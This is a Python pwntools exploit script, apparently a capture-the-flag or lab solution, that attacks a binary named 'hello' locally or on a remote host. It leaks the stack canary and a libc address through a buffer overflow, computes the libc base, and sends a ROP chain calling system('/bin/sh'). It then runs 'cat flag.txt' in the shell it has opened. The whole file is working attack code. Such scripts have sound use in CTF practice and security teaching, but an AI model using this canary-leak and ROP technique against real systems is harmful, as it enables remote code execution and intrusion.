#!/usr/bin/env python3
from pwn import *
import sys

def hack():
    if len(sys.argv) < 3:
        r = process("./hello")
    else:
        r = remote("140.113.24.241", 30174)
    r.recvuntil(b"choice:\n")

    r.sendline(b"1")
    r.recvuntil(b"> ")

    # Overflow the buffer and overwrite the first byte of canary (\0) with \n to leak the canary
    # buffer -> canary -> saved rbp
    test = "n" * (0x20+8) # Extra 8 bytes for padding (16-byte aligned)
    r.sendline(test.encode())
    r.recvuntil(f"{test}\n".encode(), drop=True)

    result = r.recvuntil(b" (Y/N)\n", drop=True)
    # Check if received the remaining canary (7 bytes) and the saved rbp (6 bytes)
    # The received string will terminate if either canary or saved rbp contains \0
    if len(result) != 13:
        return False

    canary = u64(b'\0' + result[:7])
    r.send(b'n')
    r.recvuntil(b"> ")
    
    # Lead __libc_start_call_main
    # canary -> saved rbp -> return address -> 0 -> 0 -> 1 -> __libc_start_call_main
    r.send(test.encode() + b'\n' + result + b'e' * (2 + 8*4))
    r.recvuntil(f"{test}\n".encode(), drop=True)
    result = r.recvuntil(b" (Y/N)\n", drop=True)
    # 7 + 8 + 8 + 8 + 8 + 8 + 6 = 53
    if len(result) != 53:
        return False
    __libc_start_call_main = u64(result[-6:] + b'\0' * 2) # __libc_start_call_main+128
    r.send(b'n')
    r.recvuntil(b"> ")
    
    # Compute the libc base address and get the shell
    libc_base = __libc_start_call_main - 0x29d90
    system_func = libc_base + 0x50d70
    exit_func = libc_base + 0x455f0
    pop_rdi = libc_base + 0x2a3e5
    ret = libc_base + 0x29139
    bin_sh = libc_base + 0x1d8678
    
    ans = b"A" * 0x10 + b'\0' * (0x20 - 0x10 + 8)
    ans += p64(canary)
    ans += b"BBBBBBBB"
    ans += p64(ret)
    ans += p64(pop_rdi)
    ans += p64(bin_sh)
    ans += p64(system_func)
    ans += p64(exit_func)
    r.send(ans)

    r.recvuntil(b" (Y/N)\n", drop=True)
    r.send(b'y')
    r.recvuntil(b"!\n")

    r.sendline(b"cat flag.txt && echo .....")
    print(r.recvuntil(b".....\n", drop=True).decode())
    r.close()
    return True

while not hack():
    pass
